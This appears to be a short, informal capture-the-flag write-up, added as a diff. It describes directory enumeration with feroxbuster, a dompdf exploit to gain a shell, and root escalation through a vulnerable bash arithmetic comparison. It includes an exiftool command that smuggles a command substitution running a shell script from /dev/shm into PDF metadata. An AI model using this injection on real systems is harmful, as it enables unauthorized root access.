@@ -1,0 +1,16 @@
+it was on api so  use ==ferobuster== not gobuster as 404 will freak it out ...
+
+directory finding was tough .. after that it was using ==dompdf== ..which we can exploit easily uk
+
+we get shell
+
+now it was using `[[ "$VAR" -eq "something" ]]`  in bash scripting
+
+an dit is vulnerabel
+
+```
+touch test
+exiftool -Producer='a[$(/dev/shm/uwu.sh)]+dompdf' test
+put a bash shell in /dev/shm/uwu.sh 
+and it give us shell  as root
+```
